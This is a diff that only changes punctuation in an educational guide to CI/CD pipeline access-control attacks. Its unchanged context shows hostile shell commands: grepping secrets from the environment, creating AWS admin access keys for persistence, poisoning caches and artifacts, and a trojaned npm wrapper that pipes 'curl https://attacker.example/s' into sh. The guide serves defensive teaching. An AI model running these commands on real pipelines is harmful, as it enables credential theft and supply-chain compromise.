@@ -8,16 +8,16 @@
 
 ## Understanding PBAC Attack Vectors
 
-> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in pipelines you own or are authorised to test.
+> **⚠ EDUCATIONAL PURPOSE ONLY** - the techniques below are shown so you can find and fix these issues in pipelines you own or are authorised to test.
 
-Insufficient PBAC is rarely exploited through a memory-corruption bug. It is exploited through **execution**: an attacker gets code to run inside a pipeline—via a pull request, a dependency, a test, a build script—and that code simply *uses* the access the runner already holds. The exploit is often a few lines that read an environment variable, curl the cloud metadata endpoint, or write to a shared cache. Because the flaw is in granted access rather than logic, it is cheap to abuse once code runs.
+Insufficient PBAC is rarely exploited through a memory-corruption bug. It is exploited through **execution**: an attacker gets code to run inside a pipeline-via a pull request, a dependency, a test, a build script-and that code simply *uses* the access the runner already holds. The exploit is often a few lines that read an environment variable, curl the cloud metadata endpoint, or write to a shared cache. Because the flaw is in granted access rather than logic, it is cheap to abuse once code runs.
 
 The attacker's goal in this category is usually one of:
 
 - Harvest every secret and credential the runner carries into the job's environment.
 - Assume the runner's cloud identity and act with its standing (often broad) permissions.
-- Reach systems the build should never touch—production, the control plane, internal networks.
-- Leave something behind—a poisoned cache, artifact, or implant—that a higher-trust run will consume or execute.
+- Reach systems the build should never touch-production, the control plane, internal networks.
+- Leave something behind-a poisoned cache, artifact, or implant-that a higher-trust run will consume or execute.
 
 ### Core Attack Flow
 
@@ -52,7 +52,7 @@ env | grep -Ei 'key|token|secret|password|cred' \
 # signing material -- leaves in one request.
 ```
 
-**Payoff**: bulk credential theft with no exploit—the job was *given* the secrets it never needed.
+**Payoff**: bulk credential theft with no exploit-the job was *given* the secrets it never needed.
 
 ### 2. Assuming the Runner's Standing Cloud Role
 
@@ -70,7 +70,7 @@ aws s3 ls          # read every bucket
 aws iam create-access-key --user-name admin   # persist
 ```
 
-**Payoff**: cloud-account access scoped to the *runner*, not the job—compromising one build compromises the account.
+**Payoff**: cloud-account access scoped to the *runner*, not the job-compromising one build compromises the account.
 
 ### 3. Harvesting Leftover State on a Non-Ephemeral Runner
 
@@ -144,7 +144,7 @@ echo 'malicious postinstall' >> ~/.cache/deps/node_modules/.hook
 # during dependency resolution -- as a trusted step.
 ```
 
-**Payoff**: persistence and privilege escalation—malicious content written once is consumed by many later, more-trusted runs.
+**Payoff**: persistence and privilege escalation-malicious content written once is consumed by many later, more-trusted runs.
 
 ### 8. Artifact Poisoning Between Pipelines
 
@@ -157,7 +157,7 @@ An artifact produced by a low-trust build is deployed, unverified, by a high-tru
 - run: ./deploy.sh ./dist/app      # backdoored binary reaches production
 ```
 
-**Payoff**: supply-chain compromise—the deploy pipeline's trust is lent to an artifact an untrusted job controlled.
+**Payoff**: supply-chain compromise-the deploy pipeline's trust is lent to an artifact an untrusted job controlled.
 
 ### 9. Implanting Persistence on a Reused Runner
 
@@ -171,7 +171,7 @@ printf '#!/bin/sh\ncurl -s https://attacker.example/s | sh\nexec npm.real "$@"\n
 chmod +x /usr/local/bin/npm         # trojaned toolchain for every subsequent build
 ```
 
-**Payoff**: durable foothold—every job that lands on the runner afterwards runs attacker code with that job's privileges.
+**Payoff**: durable foothold-every job that lands on the runner afterwards runs attacker code with that job's privileges.
 
 ### 10. Escaping the Job into the Runner Host / Other Tenants
 
@@ -209,11 +209,11 @@ Non-ephemeral runner keeps a kubeconfig -> low-trust job reads it
 
 ## Key Takeaways
 
-1. **Execution plus standing access equals breach**—the attacker rarely needs an exploit, only a way to run code and the privileges the runner already holds.
-2. **The metadata endpoint and the environment are the first targets**—they hand over the runner's identity and secrets for free.
-3. **Reused runners leak backwards and forwards**—leftover credentials are stolen and new implants poison future jobs.
-4. **Shared caches and artifacts carry trust across runs**—poison once, and privileged pipelines consume it.
-5. **Small grants chain**—a shared runner plus broad secrets plus a wildcard role equals account takeover with no code exploit at all.
+1. **Execution plus standing access equals breach**-the attacker rarely needs an exploit, only a way to run code and the privileges the runner already holds.
+2. **The metadata endpoint and the environment are the first targets**-they hand over the runner's identity and secrets for free.
+3. **Reused runners leak backwards and forwards**-leftover credentials are stolen and new implants poison future jobs.
+4. **Shared caches and artifacts carry trust across runs**-poison once, and privileged pipelines consume it.
+5. **Small grants chain**-a shared runner plus broad secrets plus a wildcard role equals account takeover with no code exploit at all.
 
 ## Next Steps
 
